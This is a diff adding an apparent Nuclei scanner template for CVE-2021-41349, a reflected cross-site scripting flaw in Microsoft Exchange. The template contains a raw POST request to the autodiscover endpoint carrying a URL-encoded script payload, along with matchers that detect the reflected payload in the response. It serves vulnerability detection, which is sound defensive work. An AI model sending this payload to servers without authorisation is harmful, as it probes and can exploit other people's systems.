@@ -1,0 +1,49 @@
+id: cve-2021-41349
+info:
+  name: Microsoft Exchange XSS
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Microsoft Exchange Server is vulnerable to a Cross-Site Scripting (XSS) attack, allowing attackers to obtain sensitive information such as user cookies.
+  reference:
+    - https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-41349
+  classification:
+    cve-id: CVE-2021-41349
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.5
+    cwe-id: CWE-79
+  metadata:
+    exploit-steps: true
+    exploit-id: 6847
+    tags:
+      - xss
+      - exchange
+      - microsoft
+
+http:
+  - raw:
+      - |
+        POST /autodiscover/autodiscover.json HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        %3Cscript%3Ealert%28document.domain%29%3B+a=%22%3C%2Fscript%3E&x=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "alert(document.domain);"
+          - "a=\"\""
+        part: body
+      - type: word
+        words:
+          - "text/html"
+        part: header
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "alert\\(document\\.domain\\);"
